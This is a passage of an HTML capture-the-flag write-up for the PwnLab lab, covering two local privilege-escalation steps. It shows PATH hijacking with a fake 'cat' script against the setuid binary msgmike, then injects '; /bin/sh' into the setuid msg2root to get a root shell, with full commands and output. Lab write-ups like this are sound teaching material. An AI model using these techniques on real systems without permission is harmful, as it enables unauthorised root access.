+                kane@pwnlab<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">export</span>&nbsp;<span style="color:#7f0044;font-weight:400">PATH</span>=.<span style="color:#ff9d00;font-weight:700">:/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">:/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">:/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">:/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">:/</span>sbin<span style="color:#ff9d00;font-weight:700">:/</span>bin&nbsp;<br>
+                kane@pwnlab<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<br>
+                kane@pwnlab<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"/bin/sh"</span>&nbsp;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span><br>
+                kane@pwnlab<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                total&nbsp;44K<br>
+                drwxrwxrwt&nbsp;&nbsp;7&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Apr&nbsp;11&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>34&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;21&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Mar&nbsp;17&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw-rw-rw-&nbsp;&nbsp;1&nbsp;kane&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kane&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;Apr&nbsp;11&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>34&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span><br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;www-data&nbsp;www-data&nbsp;5.4K&nbsp;Apr&nbsp;11&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>31&nbsp;dc50511dadc1c342f77e6602df3ae5c7.gif<br>
+                ...<br>
+                kane@pwnlab<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;777&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                kane@pwnlab<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kane<span style="color:#ff9d00;font-weight:700">/</span>msgmike<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=1002<span style="color:#ff9d00;font-weight:700">(</span>mike<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=1002<span style="color:#ff9d00;font-weight:700">(</span>mike<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=1002<span style="color:#ff9d00;font-weight:700">(</span>mike<span style="color:#ff9d00;font-weight:700">)</span>,1003<span style="color:#ff9d00;font-weight:700">(</span>kane<span style="color:#ff9d00;font-weight:700">)</span><br>
+                $&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) mike -&gt; root</strong></h2><br>
+        Check /home/mike, there's a similar looking binary.<br>
+        Read the strings of <code>msg2root</code> again.<br>
+            <div class="codebox">
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>mike<br>
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                total&nbsp;28K<br>
+                drwxr<span style="color:#ffdd00;font-weight:400">-x</span>---&nbsp;2&nbsp;mike&nbsp;mike&nbsp;4.0K&nbsp;Mar&nbsp;17&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;6&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Mar&nbsp;17&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;mike&nbsp;mike&nbsp;&nbsp;220&nbsp;Mar&nbsp;17&nbsp;&nbsp;2016&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;mike&nbsp;mike&nbsp;3.5K&nbsp;Mar&nbsp;17&nbsp;&nbsp;2016&nbsp;.bashrc<br>
+                -rwsr-sr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;root&nbsp;5.3K&nbsp;Mar&nbsp;17&nbsp;&nbsp;2016&nbsp;msg2root<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;mike&nbsp;mike&nbsp;&nbsp;675&nbsp;Mar&nbsp;17&nbsp;&nbsp;2016&nbsp;.profile<br>
+                $&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>msg2root&nbsp;&nbsp;<br>
+                Message&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">root</span>:&nbsp;hey<br>
+                $&nbsp;file&nbsp;msg2root&nbsp;&nbsp;&nbsp;<br>
+                msg2root:&nbsp;setuid,&nbsp;setgid&nbsp;ELF&nbsp;32-bit&nbsp;LSB&nbsp;executable,&nbsp;Intel&nbsp;80386,&nbsp;version&nbsp;1&nbsp;(SYSV),&nbsp;dynamically&nbsp;linked,&nbsp;interpreter&nbsp;/lib/ld-linux.so.2,&nbsp;for&nbsp;GNU/Linux&nbsp;2.6.32,&nbsp;BuildID[sha1]=60bf769f8fbbfd406c047f698b55d2668fae14d3,&nbsp;not&nbsp;stripped<br>
+                $&nbsp;strings&nbsp;msg2root<br>
+                ...<br>
+                Message&nbsp;for&nbsp;root:&nbsp;<br>
+                /bin/echo&nbsp;%s&nbsp;&gt;&gt;&nbsp;/root/messages.txt<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        This time it's using <code>echo</code> but by its absolute path.<br>
+        However, it's taking strings from the user - <code>%s</code><br>
+        <br>
+        In this case, you can just terminte the echo command with <code>;</code> and run a shell.<br>
+            <div class="codebox">
+                $&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>msg2root<br>
+                .<span style="color:#ff9d00;font-weight:700">/</span>msg2root<br>
+                Message&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">root</span>:&nbsp;;&nbsp;/bin/sh<br>
+                ;&nbsp;/bin/sh<br>
+                <br>
+                #&nbsp;id<br>
+                uid=1002(mike)&nbsp;gid=1002(mike)&nbsp;euid=0(root)&nbsp;egid=0(root)&nbsp;groups=0(root),1003(kane)<br>
+                #&nbsp;cd&nbsp;/root<br>
+                #&nbsp;ls<br>
+                flag.txt&nbsp;&nbsp;messages.txt
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
